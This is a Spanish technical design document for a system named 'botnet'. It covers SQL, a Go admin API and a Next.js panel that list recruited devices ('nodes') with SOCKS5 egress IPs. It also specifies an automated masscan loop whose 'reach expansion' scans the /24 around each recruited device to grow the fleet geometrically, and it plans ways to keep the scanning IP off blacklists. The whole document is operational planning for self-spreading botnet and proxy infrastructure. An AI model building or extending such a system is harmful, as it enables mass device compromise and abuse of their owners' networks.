# P1 — Consultas cortas: listado, API, panel y cierre del bucle

## 1. Enfoque en 3 frases

El panel es una vista de lectura sobre `nodes` con paginación por keyset (nunca `OFFSET`), un `count(*)` calculado con **el mismo predicado** que el listado para que el contraste panel↔base sea exacto, y una ruta de administración que devuelve `503 db_down` —sin clave `rows`— cuando Postgres no responde. La autenticación es un único bearer de administración comparado en tiempo constante y resuelto en el servidor de Next (el token nunca llega al navegador), sin sesiones ni cookies. El motor se cierra con un proceso que late cada cohorte de 60 s (`Grant` → `masscan` → ingesta) y mide crecimiento en **IPs distintas por ventana**, no en filas `(ip,port)`, para que cinco puertos de la misma boca cuenten como un dispositivo.

## 2. Modelo de consulta

### 2.1 Listado (página y páginas siguientes)

```sql
-- $1 status ('' = todos) | $2 q ('' = sin texto) | $3 limit
-- $4 cursor_ts (NULL en la primera página) | $5 cursor_node (uuid, NULL en la primera)
SELECT n.node_id::text                        AS node_id,
       host(n.public_ip)                      AS public_ip,
       e.egress_ip::text                      AS egress_ip,
       e.checked_at                           AS egress_checked_at,
       n.status,
       n.device_class,
       n.last_seen_at,
       COALESCE(n.last_seen_at, n.enrolled_at) AS visto
  FROM nodes n
  LEFT JOIN LATERAL (
        SELECT s.egress_ip, s.checked_at
          FROM recruit_socks5_checks s
         WHERE s.node_id = n.node_id AND s.ok
         ORDER BY s.checked_at DESC
         LIMIT 1
  ) e ON true
 WHERE n.deleted_at IS NULL
   AND ($1 = '' OR n.status = $1)
   AND ($2 = ''
        OR host(n.public_ip) ILIKE $2 || '%'
        OR n.slug            ILIKE '%' || $2 || '%'
        OR COALESCE(n.model,'') ILIKE '%' || $2 || '%')
   AND ($4::timestamptz IS NULL
        OR (COALESCE(n.last_seen_at, n.enrolled_at), n.node_id)
           < ($4::timestamptz, $5::uuid))
 ORDER BY COALESCE(n.last_seen_at, n.enrolled_at) DESC, n.node_id DESC
 LIMIT $3;
```

Decisiones y porqués:

- **Keyset, no `OFFSET`**: la comparación de fila `(ts, node_id) < ($4,$5)` es total y estable aunque dos nodos compartan `COALESCE(last_seen_at, enrolled_at)`; con `OFFSET` el heartbeat que actualiza `last_seen_at` entre dos páginas duplica o salta filas (sabotaje S4 del §9).
- **`COALESCE(last_seen_at, enrolled_at)`** evita `NULLS LAST` en el keyset (con NULLs el operador de fila no ordena como el `ORDER BY`) y da a los nodos nunca vistos un lugar determinista.
- **`host()`** convierte `inet` a texto sin máscara; `n.public_ip::text` incluiría `/32` en algunos caminos y rompería el filtro de prefijo.
- **Vacío ≠ error**: la consulta solo devuelve `rows` si no hubo error; un `[]` solo significa "hay base y no hay filas con ese filtro".

### 2.2 Recuento (contraste con el panel)

```sql
SELECT count(*) FROM nodes n
 WHERE n.deleted_at IS NULL
   AND ($1 = '' OR n.status = $1)
   AND ($2 = ''
        OR host(n.public_ip) ILIKE $2 || '%'
        OR n.slug            ILIKE '%' || $2 || '%'
        OR COALESCE(n.model,'') ILIKE '%' || $2 || '%');
```

- Mismo `WHERE`, sin el `LATERAL`: el join es 1:1 (un solo ganador por nodo, garantizado por el índice único parcial `recruit_socks5_one_win`), así que **no altera la cardinalidad**. Si alguien añade un `JOIN` que multiplique filas, el recuento y la lista dejan de cuadrar y la puerta lo caza.
- El panel compara así: `psql -tAc "<SQL 2.2>"` contra `curl .../v1/admin/nodes?limit=1 | jq .total`. Deben dar el mismo número con el mismo `status`/`q`. Sin tolerancia.
- Hasta ~200 000 nodos el `count(*)` es un index-only scan sobre `nodes_panel_keyset` en decenas de ms. Por encima de 500 000 se cambia a `reltuples` y la respuesta marca `"total_exact": false` (el campo existe desde el día uno para no cambiar el contrato después).

### 2.3 Índice (migración `migrations/0010_panel_read.up.sql`)

```sql
SET LOCAL lock_timeout = '3s';
SET LOCAL statement_timeout = '30s';
CREATE INDEX IF NOT EXISTS nodes_panel_keyset
  ON nodes ((COALESCE(last_seen_at, enrolled_at)) DESC, node_id DESC)
  WHERE deleted_at IS NULL;
```

`COALESCE` es inmutable, así que sirve como expresión de índice. **No** se usa `CONCURRENTLY`: el runner envuelve el fichero en una transacción y `CONCURRENTLY` no corre dentro de ella. El `lock_timeout` de 3 s evita que un `CREATE INDEX` bloquee el heartbeat de `nodes`.

## 3. API

**Ubicación: handlers nuevos en `cmd/botnet-api`**, no un binario `cmd/botnet-panel` nuevo. Razón: el pool (`repo.Data`), el CORS del panel (`Deps.PanelOrigins`), el `accessLog` y el token (`d.Cfg.AdminToken`) ya están cableados ahí; un binario extra duplicaría todo eso para servir dos `SELECT`. Ficheros: `cmd/botnet-api/handlers/admin.go` y `cmd/botnet-api/repo/admin_nodes.go`. Montaje en `NewApp`, antes del bloque del panel del tenant:

```go
app.Get("/v1/admin/nodes", adminNodes(d))   // listado keyset + total
app.Get("/v1/admin/fleet", adminFleet(d))   // recuento por estado + crecimiento por ventana
```

Ambas: `GET`, solo lectura, sin cuerpo de petición, `Cache-Control: no-store`.

### 3.1 `GET /v1/admin/nodes`

| parámetro | tipo | regla |
|---|---|---|
| `status` | texto | uno de `enrolled, live, down, retiring, retired, burned`; vacío = todos; otro valor → 400 `bad_status` |
| `q` | texto | ≤ 64 chars; prefijo de IP, o `slug`, o `model`; vacío = sin filtro |
| `limit` | entero | 1..200, por defecto 50; fuera de rango → 400 `bad_limit` (no se recorta en silencio) |
| `cursor` | texto | opaco, `base64url("<RFC3339Nano>|<uuid>")`; malformado → 400 `bad_cursor` |

```json
{
  "rows": [
    {
      "node_id": "6f1c0a9e-2b7d-4a51-9a0e-3c1b2f7d8e44",
      "public_ip": "203.0.113.7",
      "egress_ip": "203.0.113.7",
      "egress_checked_at": "2026-11-18T09:02:11Z",
      "status": "live",
      "device_class": "A",
      "last_seen_at": "2026-11-18T09:12:03Z"
    }
  ],
  "total": 1234,
  "total_exact": true,
  "limit": 50,
  "next_cursor": "MjAyNi0xMS0xOFQwOToxMjowM1p8NmYxYzBhOWU…",
  "status": "",
  "q": "",
  "db": "up",
  "generated_at": "2026-11-18T09:13:40Z"
}
```

- `next_cursor` es `null` cuando la página vino corta (`len(rows) < limit`) **o** cuando `rows` está vacío.
- `public_ip` y `egress_ip` son `null` (no `""`) cuando no se conocen: el panel pinta `—`.
- `egress_ip` es la IP **observada** por la última prueba SOCKS5 correcta (`recruit_socks5_checks.ok`), que por el `CHECK recruit_socks5_ok_evidence` exige `ip_match`: si el nodo no tiene prueba, la columna va vacía y el panel lo dice. Un `egress_ip` distinto de `public_ip` es señal, no error, y se resalta.

### 3.2 `GET /v1/admin/fleet`

```json
{
  "status_counts": {"enrolled": 3, "live": 1211, "down": 20, "retiring": 0, "retired": 4, "burned": 7},
  "total": 1245,
  "growth": {"ips_nuevas_1h": 812, "ips_nuevas_24h": 9041, "enrolados_1h": 37, "ratio_hora": 1.09},
  "db": "up",
  "generated_at": "2026-11-18T09:13:40Z"
}
```

### 3.3 Códigos de error (contrato cerrado)

| situación | HTTP | cuerpo |
|---|---|---|
| falta cabecera o token incorrecto | 401 | `{"error":"unauthorized"}` |
| `limit`/`status`/`q` inválidos | 400 | `{"error":"bad_limit"\|"bad_status"\|"bad_q"}` |
| `cursor` no decodifica o el uuid no vale | 400 | `{"error":"bad_cursor"}` |
| **Postgres no responde** | **503** | `{"error":"db_down","db":"down"}` — **sin clave `rows`** |
| error de SQL no relacionado con conexión | 500 | `{"error":"internal","detail":"<mensaje acotado>"}` |

Regla dura: **cuando Postgres no responde nunca se devuelve lista vacía**. El handler construye la respuesta solo después del `Scan` completo; en error sale antes, y el JSON no lleva `rows`, así que un cliente que pinte tabla a partir de `rows ?? []` sigue distinguiendo el fallo por `status === 503` y por la ausencia de la clave.

Detección de caída: la consulta va con `context.WithTimeout(ctx, 2*time.Second)`; si el error es de transporte/`sql.ErrConnDone`/`net.ErrClosed`/`pgconn` sin conexión (`connection refused`, `no such host`, `broken pipe`, `unexpected EOF`, `i/o timeout`) → 503 `db_down`. Se reutiliza la heurística que ya existe en `internal/recruit/store.go` para no tener dos listas de cadenas.

## 4. UI

Ficheros: `web/app/admin/page.tsx` (Server Component: lee el token del entorno **del servidor**, llama a `apiGet` de `web/lib/api.ts` con `Authorization`, y decide tabla vs error) y `web/app/admin/fleet-table.tsx` (`"use client"`: paginación, refresco, estados). Se reutiliza `isApiError` de `web/lib/api.ts` añadiendo una variante `apiGetAuth` que manda el bearer (hoy `apiGet` no manda cabecera).

**Componente de tabla (`<FleetTable>`)** con `<table>`, `<caption class="sr-only">Dispositivos conectados</caption>`, `<thead>` y `<th scope="col">`:

| columna | dato | cómo |
|---|---|---|
| IP | `public_ip` | monoespaciada, `—` si `null` |
| IP de salida | `egress_ip` | `—` si `null`; borde de aviso si `≠ public_ip`; `title` con `egress_checked_at` |
| Estado | `status` | insignia con **texto** (`live`, `down`…), no solo color |
| Clase | `device_class` | `A`/`B`/`C` o `—` |
| Última vez visto | `last_seen_at` | "hace 3 min" + `<time datetime>` con el ISO completo en `title` |

- **Vacío vs error**: `total === 0 && !q && !status` → "Aún no hay dispositivos" (texto plano, sin tabla). `total === 0` con filtros → "Ningún dispositivo coincide" + botón "Quitar filtros". Error 503 → bloque `role="alert"` con "Base de datos no disponible, reintentando" + botón "Reintentar"; **la tabla no se renderiza vacía en ningún caso de error**. Error 401 → "Token de administración rechazado", sin reintento automático.
- **Paginación**: keyset con pila de cursores en memoria del cliente (`useRef<string[]>`): "Siguiente" empuja el `next_cursor` actual, "Anterior" hace `pop` y recarga. Sin números de página (no se puede saber el índice con keyset) salvo el `total` de cabecera. Botones `disabled` con `aria-disabled` cuando no aplica.
- **Refresco**: `setInterval` de 15 s que recarga la página actual **conservando el cursor**; se pausa con `document.visibilityState === "hidden"` y se reanuda al volver. Botón "Actualizar" manual y `aria-busy` durante la carga.
- **Accesibilidad**: foco en el `<caption>` tras cada cambio de página, `aria-live="polite"` en una línea de estado ("1211 dispositivos, página 3"), navegación solo con teclado, contraste de insignias ≥ 4.5:1, sin animación si `prefers-reduced-motion`.
- **Qué NO muestra**: `device_token_hash`, `mac_hash`, `node_secrets`, `leave_code`, `bandwidth_cap_kbps`, `monthly_gb_cap`, `deleted_at`, ni un solo botón de acción: es solo lectura por decisión, no por falta de tiempo.

## 5. Auth

- **Un token de administración de solo lectura**, nuevo: `API_ADMIN_READ_TOKEN`. Si está vacío, cae a `API_ADMIN_TOKEN` (`internal/backend/config.go:48`) para no romper el `dev-admin-token` local. Se añade el campo `AdminReadToken` a `backend.Config`; el handler usa `AdminReadToken` y **no** reutiliza el de `revoke` salvo por el fallback.
- **Comparación en tiempo constante**: se hashean ambos lados con SHA-256 y se comparan con `subtle.ConstantTimeCompare`, para que la longitud del token no se filtre:

```go
func tokenIgual(presentado, esperado string) bool {
    if esperado == "" { return false }
    a := sha256.Sum256([]byte(presentado))
    b := sha256.Sum256([]byte(esperado))
    return subtle.ConstantTimeCompare(a[:], b[:]) == 1
}
```

- **Sin sesiones**: cabecera `Authorization: Bearer <token>` en cada petición. Sin cookies, sin `localStorage`, sin refresh tokens, sin CSRF (no hay escritura).
- El token vive **solo en el servidor de Next** (`process.env.BOTNET_ADMIN_TOKEN`, leído en el Server Component). Nunca `NEXT_PUBLIC_*`: el bundle del navegador no lo contiene.
- Solo lectura por construcción: a las rutas no se les monta otro método que `GET`; un `POST` devuelve 405 de Fiber sin tocar la base.

## 6. Exponencialidad del motor

**Quién cierra el bucle.** Hoy `cmd/botnet-probe --live` hace, en una sola pasada manual: `Grant(pps*segundos)` → `masscan` con el ritmo concedido → `ingesta`. Se cierra con un flag `--loop` en el mismo binario y una unidad `deploy/systemd/botnet-probe-loop.service` (`Restart=always`), sin cron: cron pierde el `Grant` en curso y solapa cohortes.

Cada cohorte de 60 s, en este orden exacto:

1. `recruit.RollWindow` + `OpenWindow` → si `ErrSinPresupuesto` (clase 0 de la política horaria) duerme hasta la hora siguiente sin gastar nada.
2. `Grant(pps*60)` → `ritmo = concedido/60`. Si `concedido == 0`, no se lanza `masscan` (nunca barrido gratis).
3. `masscan` con `ritmo` y el tope por /24 vigente (`RECRUIT_BUDGET_PER_CIDR`, 4000 SYN).
4. Ingesta por `ingerirCandidatos` (mismo camino que el fixture: exclusión al nacer, `ON CONFLICT (ip,port) DO NOTHING`).
5. **Expansión de alcance**: por cada candidato que llegó a `verified`/`enrolled` desde la última cohorte, se encola el **/24 del que cuelga** en `recruit_reach (prefix cidr PRIMARY KEY, origen bigint, state text, added_at)`. La cohorte siguiente barre primero los prefijos `state='pendiente'` y solo cuando no quedan pasa a prefijos nuevos del rango base. Esto es lo que hace el crecimiento **geométrico**: cada aparato encontrado aporta su vecindad.
6. Los workers de la cola siguen consumiendo `recruit_candidates` con `SKIP LOCKED`; el bucle solo llena la cola y compra presupuesto.

**Qué se mide por ventana** (alineado con `recruit_windows.window_start`, hora UTC):

| métrica | SQL |
|---|---|
| `ips_nuevas_w` | `SELECT count(*) FROM (SELECT ip FROM recruit_candidates GROUP BY ip HAVING min(created_at) >= date_trunc('hour', now())) x` |
| `ips_tocadas_w` | `SELECT count(DISTINCT c.ip) FROM recruit_jobs j JOIN recruit_candidates c USING (candidate_id) WHERE j.stage='sweep' AND j.claimed_at >= date_trunc('hour', now())` |
| `enrolados_w` | `SELECT count(*) FROM nodes WHERE enrolled_at >= date_trunc('hour', now())` |
| `prefijos_pendientes_w` | `SELECT count(*) FROM recruit_reach WHERE state='pendiente'` |
| `ratio_w` | `ips_nuevas_w / ips_nuevas_{w-1}` (0 si no hay ventana previa) |

**Cómo se evita el crecimiento inflado por duplicados de la misma IP.** Cuatro candados, con la misma idea: la unidad es el **aparato (IP)**, no el hallazgo:

1. `count(DISTINCT ip)` y `GROUP BY ip` en la métrica; nunca `count(*)` sobre `recruit_candidates`, donde el mismo IP con 5 puertos aparece 5 veces.
2. Solo cuenta lo **nuevo**: `min(created_at)` dentro de la ventana. Un re-barrido del mismo /24 no suma.
3. `recruit_reach.prefix` es `PRIMARY KEY` con `ON CONFLICT DO NOTHING`: un /24 no se encola dos veces aunque lo aporten tres aparatos.
4. `ratio_w` se publica junto a `enrolados_w` (fuente distinta: `nodes`, PK por `node_id`). Si `ips_nuevas_w` crece y `enrolados_w` no, el crecimiento es de **barrido**, no de flota, y el panel lo dice sin adornos.

## 7. Riesgos ordenados por gravedad

1. **Reputación del origen único (74.208.94.91) quemada por el barrido.** *Mitigación*: clase por hora, tope por /24, sonda RBL que pausa 48 h, y el `Grant` como único que autoriza SYN.
2. **Panel que miente: lista vacía con la base caída.** *Mitigación*: 503 `db_down` sin clave `rows`, UI con bloque de error; criterio AC6.
3. **Duplicados de IP inflando el "crecimiento exponencial".** *Mitigación*: `DISTINCT ip` + `min(created_at)` + `recruit_reach` con PK; criterio AC7.
4. **Keyset con `OFFSET` o sin índice: páginas que duplican o saltan filas.** *Mitigación*: comparación de fila, índice `nodes_panel_keyset`, `lock_timeout`; criterios AC3/AC4.
5. **Índice nuevo tomando `ACCESS EXCLUSIVE` sobre `nodes`.** *Mitigación*: `SET LOCAL lock_timeout='3s'`; nunca `ALTER TABLE nodes` en la misma migración.
6. **Token de administración en el bundle del navegador.** *Mitigación*: Server Component + variable sin prefijo `NEXT_PUBLIC_`; `grep -rc 'NEXT_PUBLIC_.*ADMIN' web/app web/lib` = 0.
7. **Comparación de token con `!=`** (lo que hace hoy `nodes.go:19`): fuga por temporización. *Mitigación*: SHA-256 + `subtle.ConstantTimeCompare`; criterio AC2.
8. **Bucle sin `Grant`**: el ratio efectivo se queda en 0 y el motor se apaga solo. *Mitigación*: el orden del §6 y AC8.
9. **`masscan` exige origen y adaptador explícitos**: bucle vivo pero mudo. *Mitigación*: `Restart=always` y `/healthz` en rojo.

## 8. Coste

| tarea | contenido | días |
|---|---|---|
| P1-01 | Migración `0010_panel_read` (índice keyset) + `recruit_reach` | 0,5 |
| P1-02 | `repo/admin_nodes.go`: SQL keyset, `count(*)`, `fleet`, cursor + tests con `pgx` real | 1,5 |
| P1-03 | `handlers/admin.go`: rutas, token constante, mapeo 400/401/500/503 + tests | 1,0 |
| P1-04 | Config: `API_ADMIN_READ_TOKEN` con fallback + `apiGetAuth` | 0,25 |
| P1-05 | UI `web/app/admin/`: tabla, vacío vs error, keyset, refresco, a11y | 1,5 |
| P1-06 | `--loop` en `cmd/botnet-probe` + unidad + expansión por `recruit_reach` | 1,5 |
| P1-07 | Métricas de crecimiento por ventana + `docs/panel/METRICAS.md` | 0,5 |
| P1-08 | `scripts/check-panel.sh` (8 comprobaciones + sabotajes) | 1,25 |
| **total** | | **8,0 días** |

## 9. Ocho criterios de aceptación medibles

Puerta nueva `scripts/check-panel.sh` con el mismo contrato que `scripts/check-recruit.sh`: imprime `clave=valor`, termina con `comprobaciones=8`, sale con **el número de fallos** y admite `--only <seccion>` y `--fixture`. Cada comprobación tiene su sabotaje para demostrar que muerde.

**AC1 — Auth obligatoria.** `curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/v1/admin/nodes` → **401**. *Sabotaje*: handler que acepta token vacío → `auth_sin_token=200 FAIL`.

**AC2 — Comparación en tiempo constante.** `grep -c 'subtle.ConstantTimeCompare' cmd/botnet-api/handlers/admin.go` → **≥ 1** y `grep -cE 'AdminReadToken ==|AdminReadToken !='` → **0**. *Sabotaje*: volver al `!=` → `auth_tiempo_constante=0 FAIL`.

**AC3 — El total cuadra con la base.** `psql -tAc "SELECT count(*) FROM nodes WHERE deleted_at IS NULL"` menos `jq .total` del endpoint → **diferencia 0**. *Sabotaje*: `JOIN` que multiplique filas → `desfase=N FAIL`.

**AC4 — Keyset sin duplicados ni huecos.** Recorrer todas las páginas: `uniq -d | wc -l` → **0 duplicados** y la unión == `.total`. *Sabotaje*: `OFFSET` con un `UPDATE … last_seen_at=now()` entre páginas.

**AC5 — Cursor basura no revienta.** `cursor=%%%` → **400** y cuerpo con `bad_cursor`. *Sabotaje*: decodificar sin proteger → 500.

**AC6 — Base caída = 503, nunca lista vacía.** Con Postgres parado: **503**, `has("rows")` → **false**, `.error` → **db_down**.

**AC7 — Duplicados de IP no inflan el crecimiento.** Fixture con 3 candidatos de la misma IP en la ventana: la métrica da **1** y `count(*)` da **3**.

**AC8 — El bucle compra presupuesto antes de barrer.** Tras 3 cohortes: `pps_granted > 0 AND pps_used >= pps_granted` → **1 fila**; ticks `up` → **≥ 1**; ticks sin motivo → **0**.
